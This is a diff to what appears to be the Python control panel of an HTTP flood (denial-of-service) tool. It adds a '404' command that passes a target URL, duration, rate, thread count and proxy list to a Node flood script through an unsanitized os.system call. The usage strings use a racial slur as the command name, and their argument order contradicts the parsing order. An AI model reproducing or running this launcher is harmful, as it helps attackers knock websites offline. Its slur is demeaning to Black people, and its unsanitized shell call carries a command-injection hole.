@@ -644,6 +644,18 @@ def main():
                 print('Usage: Nigga <target> <time> <threads> <http.txte> <rps>')
                 print('Example: Nigga https://example.com 60 500 http.txt 500')
 
+        elif "404" in cnc:
+            try:
+                target = cnc.split()[1]
+                time = cnc.split()[2]
+                rate = cnc.split()[3]
+                threads = cnc.split()[4]
+                proxy = cnc.split()[5]
+                os.system(f'node HTTP-NIGGA.js {target} {time} {rate} {threads} {proxy}')
+            except IndexError:
+                print('Usage: Nigga <target> <time> <threads> <http.txte> <rps>')
+                print('Example: Nigga https://example.com 60 500 http.txt 500')
+
         
 
 # BANNERS
